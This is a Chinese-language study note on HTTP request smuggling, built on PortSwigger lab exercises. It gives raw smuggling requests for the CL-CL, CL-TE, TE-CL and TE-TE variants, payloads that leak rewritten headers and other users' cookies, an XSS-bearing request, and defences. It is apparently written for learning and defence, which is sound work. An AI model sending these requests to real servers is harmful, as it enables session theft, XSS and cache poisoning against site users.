# 实验：HTTP请求走私

参考连接：https://www.anquanke.com/post/id/188293

笔记中的实验可以在参考连接中找到链接

## 知识点

CDN

TCP重用

## 原理

​	当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同。代理服务器可能认为这是一个HTTP请求，然后转发给后端的源站服务器，但在源站服务器经过解析后，只认为其中的一部分为正常请求，剩下的一部分就是**走私**的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。

​	总结一下就是，前端和后端对数据的不同处理，导致http包意义被改变。

## 专业名字解释

CL：Content-Length

TE：Transfer-Encoding

## 实验

**核心**：使前端请求通过、后端处理请求提前结束，其中由于前后端服务的差异，导致剩余数据流与后面的请求拼接。

**影响**：

- 返回数据的顺序
- 用户信息的泄露

### 实验1：CL不为0

以下为请求：

```
GET / HTTP/1.1rn
Host: example.comrn
Content-Length: 44rn

GET / secret HTTP/1.1rn
Host: example.comrn
rn
```

前端处理CL，后端忽略。

一个请求中包含另一个请求，由于后端不检查CL使得下方的HTTP可以被后端读取（走私）

###  实验2：CL-CL

```
POST / HTTP/1.1rn
Host: example.comrn
Content-Length: 8rn
Content-Length: 7rn

12345rn
a
```

前端检查的是第一个CL，而后端检查第二个，导致走私。

> 例子中，CL为7时，a并未被读取，a被拼接到下一个http请求中，导致后面的用户使用受影响。

### 实验3：CL-TE

当收到存在两个请求头的请求包时，前端代理只CL请求头，而后端只处理TE请求头。

由于后端不检查CL，所以可以伪造TE，导致当前数据流入下一个数据包

```
POST / HTTP/1.1rn
Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.netrn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0rn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8rn
Accept-Language: en-US,en;q=0.5rn
Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3rn
Connection: keep-alivern
Content-Length: 6rn	//请求体中的/r/n要算入字符
Transfer-Encoding: chunkedrn
rn
0rn	//chunk分块长度为0
rn
G	//该字符流入下一个HTTP请求中，使得服务器解析下一个包时出现错误
```

### 实验4：TE-CL

即前端处理TE，而后端处理CL

```
POST / HTTP/1.1rn
Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.netrn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0rn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8rn
Accept-Language: en-US,en;q=0.5rn
Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifewrn
Content-Length: 4rn	//前端不检查，后端只读取前4
Transfer-Encoding: chunkedrn	//chunk分块正常
rn
12rn	//被后端读取至此结束
GPOST / HTTP/1.1rn	//下方内容作为下一个http请求流入
rn
0rn
rn
```

### 实验5：TE-TE

前后端都处理TE请求头，此时，可以对请求包中的TE做混淆

```
POST / HTTP/1.1rn
Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.netrn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0rn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8rn
Accept-Language: en-US,en;q=0.5rn
Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8rn
Content-length: 4rn
Transfer-Encoding: chunkedrn
Transfer-encoding: cowrn
rn
5crn
GPOST / HTTP/1.1rn
Content-Type: application/x-www-form-urlencodedrn
Content-Length: 15rn
rn
x=1rn
0rn
rn
```



## 参考链接知识点

1. 二进制安全：针对函数处理字符串的说法，对字符串中的字符都平等读取，不做特殊意义处理（例如不对'\0'、转义字符做处理，直接读取原始数据）

> 参考连接：https://blog.csdn.net/luoyanjiewade/article/details/88229820

2. 通过拼接下一个http请求盗取下个请求的所有请求头

#### 第一个补丁

```
对 空格: 有限制，但是没有对应处理。
```

#### 第二个补丁

```
返回400错误时，关闭tcp连接。
```

对 null：ATS会截断返回400

由于打补丁前tcp没有关闭连接，导致http pipeline的返回顺序被破坏，其他用户可能收到远程响应

#### 第三个补丁

```
当Content-Length请求头不匹配时，响应400，删除具有相同Content-Length请求头的重复副本，如果存在Transfer-Encoding请求头，则删除Content-Length请求头。
```

CL-TE攻击可以生效。

#### 第四个补丁

```
当缓存命中时，清空请求体
```

在命中缓存的同时，补丁会忽略掉CL并删除掉请求体，由于忽略CL，会直接检测下一个请求行，当请求体中遇到请求行时，会当作下一个http请求处理。如下例：

构造请求：

```
GET /1.html HTTP/1.1rn
Host: lnmp.mengsec.comrn
Cache-control: max-age=10rn
Content-Length: 56rn
rn
GET /random_str.php HTTP/1.1rn
Host: lnmp.mengsec.comrn
rn
```

请求中的资源命中缓存，CL被忽略，直接读取到请求体中的请求行，导致http请求走私成功。



## 其他攻击实例

### 获取前端服务器重写请求字段

Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

在一般的网络环境下，前端代理服务器在收到请求后，不会直接发送给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段对于服务器处理请求是必须的，例如：

		- 描述TLS连接所使用的协议的密码
		- 包含用户IP的XFF头
		- 用户的会话令牌ID

在走私请求时，若没有这些字段，后端服务器是不能正确处理请求的。

要获取重写字段，可以按如下三个字段：

- 找一个能够将请求参数的值输出到响应中的POST请求
- 把该POST请求找到的特殊参数放在消息体后面
- 走私这一请求，然后直接发送一个普通请求，前端服务器对这个请求重写的字段就会显示出来。

构造请求如下：

```
POST / HTTP/1.1
Host: ac831f8c1f287d3d808d2e1c00280087.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Type: application/x-www-form-urlencoded
Cookie: session=2rOrjC16pIb7ZfURX8QlSuU1v6UMAXLA
Content-Length: 77
Transfer-Encoding: chunked

0


POST / HTTP/1.1
Content-Length: 70
Connection: close

search=123
```

注意下方走私的请求CL为70，即会把下方长度70的数据流返回给客户端从而暴露前端重写的请求头。



### 获取其他用户响应

请求和上方构造POST请求区别不大，走私的post请求中CL长度较大，导致后面的请求也被当做数据返回，使得其他用户的cookie泄露。

构造UA如下，获得响应的位置。

![img](https://p2.ssl.qhimg.com/dm/1024_667_/t015eacd462a5bf6563.png)

构造请求：

```
POST / HTTP/1.1
Host: ac801fd21fef85b98012b3a700820000.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: "><script>alert(1)</script>#
Content-Type: application/x-www-form-urlencoded
```

走私的请求会在其他用户响应中形成xss。



### 缓存投毒

构造请求打乱了服务器的返回顺序。使得获取缓存中的内容，可能是其他人的缓存。

## 防御手段

- 禁用代理服务器与后端服务器之间的tcp连接重用
- 使用HTTP/2协议
- 前后端使用相同的服务器

以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。